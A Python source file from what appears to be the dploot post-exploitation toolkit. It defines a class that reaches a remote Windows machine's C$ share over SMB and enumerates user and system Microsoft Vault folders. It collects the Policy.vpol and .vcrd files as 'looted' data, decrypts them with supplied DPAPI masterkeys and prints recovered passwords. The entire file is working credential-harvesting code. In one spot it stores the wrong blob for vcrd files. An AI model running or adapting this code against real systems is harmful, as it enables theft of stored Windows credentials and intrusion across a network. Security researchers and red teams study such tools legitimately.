import logging
import ntpath
from typing import List
from binascii import hexlify

from impacket.structure import hexdump
from impacket.dpapi import VAULT_INTERNET_EXPLORER, VAULT_WIN_BIO_KEY, VAULT_NGC_ACCOOUNT

from dploot.lib.dpapi import decrypt_vcrd, decrypt_vpol, find_masterkey_for_vpol_blob
from dploot.lib.smb import DPLootSMBConnection
from dploot.lib.target import Target
from dploot.lib.utils import is_guid

class VaultsTriage:

    false_positive = ['.','..', 'desktop.ini','Public','Default','Default User','All Users']
    user_vault_generic_path = [
        'Users\\%s\\AppData\\Local\\Microsoft\\Vault',
        'Users\\%s\\AppData\\Roaming\\Microsoft\\Vault',
    ]
    system_vault_generic_path = [
        "Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Vault",
        "Windows\\System32\\config\\systemprofile\\AppData\\Roaming\\Microsoft\\Vault",
        "Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\Vault",
        "Windows\\ServiceProfiles\\LocalService\\AppData\\Roaming\\Microsoft\\Vault",
        "Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Vault",
        "Windows\\ServiceProfiles\\NetworkService\\AppData\\Roaming\\Microsoft\\Vault"
    ]
    share = 'C$'
    vpol_filename = 'Policy.vpol'

    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: list) -> None:
        self.target = target
        self.conn = conn
        
        self._is_admin = None
        self._users = None
        self.looted_files = dict()
        self.masterkeys = masterkeys

    def triage_system_vaults(self) -> None:
        logging.info('Triage SYSTEM Vaults\n')
        vault_dirs = self.conn.listDirs(self.share, self.system_vault_generic_path)
        for system_vault_path,system_vault_dir in vault_dirs.items():
            if system_vault_dir is not None:
                self.triage_vaults_folder(vaults_folder_path=system_vault_path,vaults_folder=system_vault_dir)
        print()

    def triage_vaults(self) -> None:
        logging.info('Triage Vaults for ALL USERS\n')
        for user in self.users:
            try:
                self.triage_vaults_for_user(user) 
            except Exception as e:
                print(str(e))
                pass
        print()

    def triage_vaults_for_user(self, user:str) -> None:
        vault_dirs = self.conn.listDirs(self.share, [elem % user for elem in self.user_vault_generic_path])
        for user_vault_path,user_vault_dir in vault_dirs.items():
            if user_vault_dir is not None:
                self.triage_vaults_folder(vaults_folder_path=user_vault_path,vaults_folder=user_vault_dir)

    def triage_vaults_folder(self, vaults_folder_path, vaults_folder) -> None:
        for d in vaults_folder:
            if is_guid(d.get_longname()) and d.is_directory()>0:
                vault_dirname = d.get_longname()
                vault_directory_path = ntpath.join(vaults_folder_path,vault_dirname)
                logging.info("Found Vault Directory: \\\\%s\\%s\\%s\n" %  (self.target.address,self.share,vault_directory_path))
                
                # read vpol blob
                vpol_filepath = ntpath.join(vault_directory_path,self.vpol_filename)
                vpolblob_bytes = self.conn.readFile(self.share,vpol_filepath)
                vpol_keys = list()
                if vpolblob_bytes is not None and self.masterkeys is not None:
                    self.looted_files[vault_dirname + '_' + self.vpol_filename] = vpolblob_bytes    
                    masterkey = find_masterkey_for_vpol_blob(vpolblob_bytes, self.masterkeys)
                    if masterkey is not None:
                        vpol_decrypted = decrypt_vpol(vpolblob_bytes,masterkey)
                        vpol_decrypted.dump()
                        if vpol_decrypted['Key1']['Size'] > 0x24:
                            vpol_keys.append(
                                hexlify(vpol_decrypted['Key2']['bKeyBlob']))
                            vpol_keys.append(
                                hexlify(vpol_decrypted['Key1']['bKeyBlob']))
                        else:
                            vpol_keys.append(
                                hexlify(
                                    vpol_decrypted['Key2']['bKeyBlob']['bKey']).decode('latin-1'))
                            vpol_keys.append(
                                hexlify(
                                    vpol_decrypted['Key1']['bKeyBlob']['bKey']).decode('latin-1'))
                    else:
                        logging.info("Could not decrypt...")

                # read vrcd blob
                vault_dir = self.conn.remote_list_dir(self.share, vault_directory_path)
                for file in vault_dir:
                    filename = file.get_longname()
                    if filename != self.vpol_filename and filename not in self.false_positive and file.is_directory() == 0 and filename[-4:] == 'vcrd':
                        vrcd_filepath = ntpath.join(vault_directory_path,filename)
                        vrcd_bytes = self.conn.readFile(self.share, vrcd_filepath)
                        self.looted_files[vault_dirname + '_' + vrcd_filepath] = vpolblob_bytes  
                        if vrcd_bytes is not None and filename[-4:] in ['vsch','vcrd'] and len(vpol_keys) > 0:
                            vault = decrypt_vcrd(vrcd_bytes, vpol_keys)
                            if isinstance(vault, (VAULT_INTERNET_EXPLORER, VAULT_WIN_BIO_KEY, VAULT_NGC_ACCOOUNT)):
                                vault.dump()
                                if isinstance(vault, VAULT_INTERNET_EXPLORER):
                                    print('Decoded Password: %s' % vault['Password'].decode('latin-1'))
                                    print()
                            else:
                                logging.info('Vault decrypted but unknown data structure:')
                                hexdump(vault)

    @property
    def is_admin(self) -> bool:
        if self._is_admin is not None:
            return self._is_admin

        self._is_admin = self.conn.is_admin()
        return self._is_admin

    @property
    def users(self) -> List[str]:
        if self._users is not None:
            return self._users
        
        users = list()

        users_dir_path = 'Users\\*'
        directories = self.conn.listPath(shareName=self.share, path=ntpath.normpath(users_dir_path))
        for d in directories:
            if d.get_longname() not in self.false_positive and d.is_directory() > 0:
                users.append(d.get_longname())
    
        self._users = users

        return self._users